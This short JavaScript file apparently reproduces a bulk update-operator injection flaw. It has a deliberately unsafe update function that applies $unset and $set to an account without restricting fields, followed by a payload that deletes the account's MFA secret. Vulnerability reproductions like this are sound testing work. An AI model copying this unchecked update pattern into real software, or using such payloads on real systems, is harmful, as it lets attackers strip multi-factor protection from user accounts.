const account = {
  username: "guest",
  displayName: "Guest",
  mfaSecret: "enrolled-secret",
  role: "guest",
};

function applyBulkUpdate(document, operation) {
  for (const field of Object.keys(operation.updateOne.update.$unset ?? {})) {
    delete document[field];
  }
  Object.assign(document, operation.updateOne.update.$set ?? {});
}

applyBulkUpdate(account, {
  updateOne: {
    filter: { username: "guest" },
    update: { $unset: { mfaSecret: 1 } },
  },
});
if (Object.hasOwn(account, "mfaSecret")) {
  throw new Error("bulk update-operator injection not reproduced");
}
console.log("vulnerable bulk update removed the MFA secret");
